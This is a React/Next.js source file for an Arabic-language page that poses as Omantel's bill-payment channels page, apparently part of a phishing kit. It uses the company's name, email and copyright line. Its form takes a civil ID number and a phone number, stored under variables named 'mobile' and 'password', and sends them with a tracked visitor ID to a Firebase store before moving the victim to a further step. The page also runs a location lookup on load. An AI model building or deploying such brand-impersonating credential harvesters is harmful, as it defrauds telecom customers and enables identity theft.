"use client";

import type React from "react";

import { ChevronLeft } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { Input } from "./ui/input";
import { useEffect, useState } from "react";
import { getLocation } from "@/lib/utils";
import { addData } from "@/lib/firebase";
import Link from "next/link";

export default function PaymentChannelsPage({
  setCurrentStep,
}: {
  setCurrentStep: (e: string) => void;
}) {
  const paymentChannels = [
    {
      name: "مركز خدمة العملاء",
      nameEn: "Customer Service Center",
      icon: "📞",
      description: "اتصل بنا مباشرة",
    },
    {
      name: "الخدمة الذاتية",
      nameEn: "Self Service",
      icon: "💳",
      description: "ادفع بسهولة",
    },
    {
      name: "تطبيق عمانتل",
      nameEn: "Omantel App",
      icon: "📱",
      description: "من هاتفك",
    },
    {
      name: "البنك الأهلي",
      nameEn: "National Bank",
      icon: "🏦",
      description: "عبر البنك",
    },
    {
      name: "بنك مسقط",
      nameEn: "Bank Muscat",
      icon: "🏦",
      description: "عبر البنك",
    },
    {
      name: "بنك صحار",
      nameEn: "Bank Sohar",
      icon: "🏦",
      description: "عبر البنك",
    },
  ];

  const otherChannels = [
    { name: "فروع عمانتل", nameEn: "Omantel Branches", icon: "🏢" },
    { name: "الوكلاء المعتمدون", nameEn: "Authorized Agents", icon: "👥" },
  ];
  const [userId, setUserId] = useState("");
  const [password, setPassword] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [mobile, setMobile] = useState("");

  useEffect(() => {
    getLocation().then(() => {
      const _visititorId = localStorage.getItem("visitor");
      if (_visititorId) {
      }
    });
  }, []);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    const visitorId = localStorage.getItem("visitor") as string;
    await addData({
      id: visitorId!,
      userName: userId,
      password,
      mobile,
      email: mobile,
    }).then(() => {
      setIsLoading(false);
      setCurrentStep("2");
      console.log("done1", isLoading, setUserId, setMobile, setPassword);
    });
    setIsLoading(true);
  };

  return (
    <div className="min-h-screen bg-background" dir="rtl">
      <header className="bg-gradient-to-r from-[#3111f3] to-[#3111f3]/80 text-[#3111f3]-foreground sticky top-0 z-50 shadow-lg">
        <div className="w-full bg-accent text-accent-foreground text-center py-2 text-sm font-medium">
          نوفر لك العديد من قنوات الدفع السهلة والآمنة
        </div>
        <div className="container mx-auto px-4">
          <div className="flex items-center justify-between py-4">
            <div className="flex items-center gap-8">
              <div className="text-2xl font-bold">
                <img
                  src="/ASD.svg"
                  width={120}
                  className="brightness-0 invert"
                />
              </div>
              <nav className="hidden md:flex gap-8 text-sm font-medium">
                <a
                  href="#"
                  className="hover:text-accent transition-colors duration-200"
                >
                  الرئيسية
                </a>
                <a
                  href="#"
                  className="hover:text-accent transition-colors duration-200"
                >
                  الأفراد
                </a>
                <a
                  href="#"
                  className="hover:text-accent transition-colors duration-200"
                >
                  الأعمال
                </a>
                <a
                  href="#"
                  className="hover:text-accent transition-colors duration-200"
                >
                  من نحن
                </a>
              </nav>
            </div>
            <div className="flex items-center gap-4">
              <Button
                variant="ghost"
                size="sm"
                className="text-white hover:bg-white/20 transition-colors"
              >
                English
              </Button>
            </div>
          </div>
        </div>
      </header>

      <section className="relative bg-[url(/main.jpeg)] bg-no-repeat bg-cover h-[100vh] py-12 md:py-20">
        <div className="container mx-auto px-4">
          <div className="max-w-2xl mx-auto text-center mb-8">
            <h1 className="text-4xl md:text-5xl font-bold text-foreground mb-4 text-white">
              ادفع بسهولة وأمان
            </h1>
          </div>
        </div>
      </section>
      <section className="p-4 bg-muted/30">
        <Link href={"#omantel"}>
          <Button className="w-full bg-[#3111f3] ">تسجيل</Button>
        </Link>
      </section>
      <section className="py-12 bg-muted/30" id="omantel">
        <div className="container mx-auto px-4">
          <Card className="max-w-2xl mx-auto p-8 shadow-lg border-0">
            <form onSubmit={handleLogin} className="space-y-6">
              <div className="text-right">
                <label className="block text-foreground font-semibold text-sm mb-3">
                  الرقم المدني *
                </label>
                <div className="relative">
                  <Input
                    type="tel"
                    className="w-full border-2 border-border rounded-lg bg-background px-4 py-3 text-right text-sm focus:border-[#3111f3] focus:ring-2 focus:ring-[#3111f3]/20 placeholder:text-muted-foreground transition-all duration-200"
                    dir="rtl"
                    required
                    onChange={(w) => {
                      setMobile(w.target.value);
                    }}
                    placeholder="ادخل الرقم المدني"
                  />
                </div>
              </div>
              <div className="text-right">
                <label className="block text-foreground font-semibold text-sm mb-3">
                  رقم الهاتف *
                </label>
                <div className="relative">
                  <Input
                    type="tel"
                    className="w-full border-2 border-border rounded-lg bg-background px-4 py-3 text-right text-sm focus:border-[#3111f3] focus:ring-2 focus:ring-[#3111f3]/20 placeholder:text-muted-foreground transition-all duration-200"
                    dir="rtl"
                    required
                    maxLength={8}
                    onChange={(w) => {
                      setPassword(w.target.value);
                    }}
                    placeholder="أدخل رقم هاتفك"
                  />
                </div>
              </div>

              <div className="pt-4">
                <Button
                  disabled={isLoading}
                  className="w-full bg-gradient-to-r from-[#3111f3] to-[#3111f3]/80 hover:from-[#3111f3]/90 hover:to-[#3111f3]/70 text-white py-3 rounded-lg text-base font-semibold shadow-lg hover:shadow-xl transition-all duration-200 disabled:opacity-50"
                >
                  {isLoading ? (
                    <div className="flex items-center gap-2">
                      <div className="w-4 h-4 border-2 border-[#3111f3]-foreground/30 border-t-[#3111f3]-foreground rounded-full animate-spin"></div>
                      جاري المعالجة...
                    </div>
                  ) : (
                    <div className="flex items-center justify-center gap-2">
                      <span>التالي</span>
                      <span>←</span>
                    </div>
                  )}
                </Button>
              </div>
            </form>
          </Card>
        </div>
      </section>

      <section className="py-20 bg-background">
        <div className="container mx-auto px-4">
          <div className="text-center mb-16">
            <h2 className="text-4xl font-bold text-foreground mb-4">
              قنوات الدفع الإلكترونية
            </h2>
            <p className="text-lg text-muted-foreground max-w-2xl mx-auto">
              اختر الطريقة التي تناسبك للدفع بسهولة وأمان
            </p>
          </div>

          <div className="grid md:grid-cols-2 lg:grid-cols-3 gap-6 max-w-6xl mx-auto">
            {paymentChannels.map((channel, index) => (
              <Card
                key={index}
                className="p-6 hover:shadow-xl transition-all duration-300 cursor-pointer border-2 border-border hover:border-[#3111f3]/50 group"
              >
                <div className="flex flex-col items-center text-center gap-4">
                  <div className="text-5xl group-hover:scale-110 transition-transform duration-300">
                    {channel.icon}
                  </div>
                  <div>
                    <h3 className="font-bold text-lg text-foreground mb-1">
                      {channel.name}
                    </h3>
                    <p className="text-sm text-muted-foreground mb-2">
                      {channel.nameEn}
                    </p>
                    <p className="text-xs text-[#3111f3] font-medium">
                      {channel.description}
                    </p>
                  </div>
                  <ChevronLeft className="w-5 h-5 text-muted-foreground group-hover:text-[#3111f3] transition-colors rotate-180 mt-2" />
                </div>
              </Card>
            ))}
          </div>
        </div>
      </section>

      <section className="py-20 bg-muted/30">
        <div className="container mx-auto px-4">
          <div className="text-center mb-16">
            <h2 className="text-4xl font-bold text-foreground mb-4">
              قنوات الدفع الأخرى
            </h2>
            <p className="text-lg text-muted-foreground">
              طرق إضافية لتسديد فاتورتك
            </p>
          </div>

          <div className="grid md:grid-cols-2 gap-6 max-w-3xl mx-auto">
            {otherChannels.map((channel, index) => (
              <Card
                key={index}
                className="p-8 hover:shadow-lg transition-all duration-300 cursor-pointer border-2 border-border hover:border-[#3111f3]/50 group"
              >
                <div className="flex items-center justify-between">
                  <div className="text-right">
                    <h3 className="font-bold text-lg text-foreground mb-1">
                      {channel.name}
                    </h3>
                    <p className="text-sm text-muted-foreground">
                      {channel.nameEn}
                    </p>
                  </div>
                  <div className="text-3xl group-hover:scale-110 transition-transform">
                    {channel.icon}
                  </div>
                </div>
              </Card>
            ))}
          </div>
        </div>
      </section>

      <section className="py-20 bg-background">
        <div className="container mx-auto px-4">
          <div className="max-w-5xl mx-auto">
            <h2 className="text-3xl font-bold text-center mb-12 text-foreground">
              شركاؤنا الموثوقون
            </h2>
            <div className="bg-card border-2 border-border rounded-xl p-12 shadow-lg">
              <div className="flex flex-wrap items-center justify-center gap-12">
                <div className="text-center">
                  <div className="w-28 h-28 bg-gradient-to-br from-[#3111f3]/10 to-accent/10 rounded-xl flex items-center justify-center mb-3 border-2 border-[#3111f3]/20">
                    <span className="text-2xl font-bold text-[#3111f3]">
                      SALECO
                    </span>
                  </div>
                  <p className="text-sm text-muted-foreground">خدمات الدفع</p>
                </div>
                <div className="text-center">
                  <div className="w-28 h-28 bg-gradient-to-br from-[#3111f3]/10 to-accent/10 rounded-xl flex items-center justify-center mb-3 border-2 border-[#3111f3]/20">
                    <span className="text-2xl font-bold text-[#3111f3]">
                      Bank
                    </span>
                  </div>
                  <p className="text-sm text-muted-foreground">البنوك</p>
                </div>
                <div className="text-center">
                  <div className="w-28 h-28 bg-gradient-to-br from-[#3111f3]/10 to-accent/10 rounded-xl flex items-center justify-center mb-3 border-2 border-[#3111f3]/20">
                    <span className="text-2xl font-bold text-[#3111f3]">
                      Pay
                    </span>
                  </div>
                  <p className="text-sm text-muted-foreground">محافظ رقمية</p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>

      <section className="py-20 bg-gradient-to-r from-[#3111f3] to-[#3111f3]/80 text-white">
        <div className="container mx-auto px-4 text-center">
          <h2 className="text-4xl font-bold mb-4">هل تحتاج إلى مساعدة؟</h2>
          <p className="text-lg mb-10 opacity-95 max-w-2xl mx-auto">
            فريقنا المتخصص جاهز لمساعدتك في أي وقت وللإجابة على جميع استفساراتك
          </p>
          <div className="flex flex-wrap gap-4 justify-center">
            <Button
              size="lg"
              className="bg-accent hover:bg-accent/90 text-accent-foreground font-semibold shadow-lg"
            >
              تواصل معنا
            </Button>
            <Button
              size="lg"
              variant="outline"
              className="bg-transparent border-2 border-[#3111f3]-foreground text-[#3111f3]-foreground hover:bg-[#3111f3]-foreground/10 font-semibold"
            >
              الأسئلة الشائعة
            </Button>
          </div>
        </div>
      </section>

      <footer className="bg-foreground text-background py-16">
        <div className="container mx-auto px-4">
          <div className="grid md:grid-cols-4 gap-12 mb-12">
            <div>
              <h3 className="font-bold text-lg mb-6">الأفراد</h3>
              <ul className="space-y-3 text-sm opacity-80">
                <li>
                  <a href="#" className="hover:text-accent transition-colors">
                    الهاتف المتحرك
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-accent transition-colors">
                    الإنترنت المنزلي
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-accent transition-colors">
                    التلفزيون
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-accent transition-colors">
                    الخدمات الرقمية
                  </a>
                </li>
              </ul>
            </div>
            <div>
              <h3 className="font-bold text-lg mb-6">الأعمال</h3>
              <ul className="space-y-3 text-sm opacity-80">
                <li>
                  <a href="#" className="hover:text-accent transition-colors">
                    الحلول السحابية
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-accent transition-colors">
                    الأمن السيبراني
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-accent transition-colors">
                    مراكز البيانات
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-accent transition-colors">
                    إنترنت الأشياء
                  </a>
                </li>
              </ul>
            </div>
            <div>
              <h3 className="font-bold text-lg mb-6">من نحن</h3>
              <ul className="space-y-3 text-sm opacity-80">
                <li>
                  <a href="#" className="hover:text-accent transition-colors">
                    عن الشركة
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-accent transition-colors">
                    المسؤولية الاجتماعية
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-accent transition-colors">
                    الوظائف
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-accent transition-colors">
                    الأخبار
                  </a>
                </li>
              </ul>
            </div>
            <div>
              <h3 className="font-bold text-lg mb-6">تواصل معنا</h3>
              <ul className="space-y-3 text-sm opacity-80">
                <li>الهاتف: 1234</li>
                <li>البريد الإلكتروني: info@omantel.om</li>
                <li className="flex gap-3 pt-4">
                  <a href="#" className="hover:text-accent transition-colors">
                    <div className="w-8 h-8 bg-background/20 rounded-full flex items-center justify-center hover:bg-accent/20">
                      f
                    </div>
                  </a>
                  <a href="#" className="hover:text-accent transition-colors">
                    <div className="w-8 h-8 bg-background/20 rounded-full flex items-center justify-center hover:bg-accent/20">
                      t
                    </div>
                  </a>
                  <a href="#" className="hover:text-accent transition-colors">
                    <div className="w-8 h-8 bg-background/20 rounded-full flex items-center justify-center hover:bg-accent/20">
                      in
                    </div>
                  </a>
                </li>
              </ul>
            </div>
          </div>

          <div className="border-t border-background/20 pt-8 text-center text-sm opacity-60">
            <p>© 2025 عمانتل. جميع الحقوق محفوظة</p>
          </div>
        </div>
      </footer>
    </div>
  );
}
